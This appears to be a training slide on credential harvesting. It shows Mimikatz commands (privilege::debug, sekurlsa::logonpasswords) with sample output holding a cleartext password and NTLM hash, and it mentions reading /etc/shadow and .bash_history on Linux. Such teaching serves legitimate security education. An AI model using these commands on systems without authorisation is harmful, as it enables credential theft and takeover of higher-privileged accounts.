Credential Harvesting - Unlocking Higher Access

Extracting Passwords and Hashes from Memory

What is Credential Harvesting?

The act of extracting user credentials (passwords, hashes, tokens) from a compromised system's memory, registry, or files.

Mimikatz on Windows

The primary tool for dumping credentials from LSASS memory, often yielding cleartext passwords or NTLM hashes.

Linux Equivalents

Checking .bash_history for reused passwords or attempting to read /etc/shadow if permissions allow.

Mimikatz Commands
mimikatz # privilege::debug
  # Enables debug privileges, often required for LSASS access
  Privilege '20' (SeDebugPrivilege) OK

mimikatz # sekurlsa::logonpasswords
  # Dumps credentials from LSASS memory
  ...
  [LOGON::User]
      UserName  : Administrator
      Domain    : WORKGROUP
      Password  : MySecretPassword123
      NTLM      : 1234567890abcdef1234567890abcdef
  ...
Key Takeaway

Credential harvesting, particularly with Mimikatz on Windows, is a powerful technique to gain higher-privileged accounts and expand control over the system.
